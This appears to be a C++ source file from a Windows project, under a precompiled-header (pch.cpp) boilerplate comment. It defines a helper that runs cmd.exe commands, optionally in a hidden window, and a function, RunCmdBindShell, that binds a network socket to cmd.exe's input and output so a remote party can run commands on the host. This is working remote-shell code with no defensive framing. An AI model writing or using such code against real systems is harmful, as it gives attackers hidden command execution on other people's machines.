// pch.cpp: source file corresponding to the pre-compiled header

#include "pch.h"

// When you are using pre-compiled headers, this source file is necessary for compilation to succeed.

/*
 *  Run (cmdPath + args) and stay open:
 *    => RunCmd(cmdPath, args, true, 0);
 *
 *  Run (cmdPath + args) discreetly:
 *    => RunCmd(cmdPath, args, false, CREATE_NO_WINDOW);
*/
void RunCmd(std::wstring cmdPath, std::wstring args, BOOL keepOpen, DWORD dwCreationFlags)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    std::wstring option = keepOpen ? L" /k " : L" /c ";

    std::wstring fullCmd = cmdPath + option + args;
    std::vector<WCHAR> wArgs(fullCmd.begin(), fullCmd.end());
    wArgs.push_back(0); // fkn null terminator

    //                       d(O.o)b
    //CreateProcess(cmdPath, &args[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    CreateProcess(NULL, wArgs.data(), NULL, NULL, FALSE, dwCreationFlags, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

void RunCmdBindShell(std::wstring cmdPath, HANDLE clientSocket, BOOL keepOpen, DWORD dwCreationFlags)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = clientSocket;

    std::wstring option = keepOpen ? L" /k" : L" /c";

    std::wstring fullCmd = cmdPath + option;
    std::vector<WCHAR> wArgs(fullCmd.begin(), fullCmd.end());
    wArgs.push_back(0); // fkn null terminator

    //                       d(O.o)b
    //CreateProcess(cmdPath, &args[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    CreateProcess(NULL, wArgs.data(), NULL, NULL, TRUE, dwCreationFlags, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}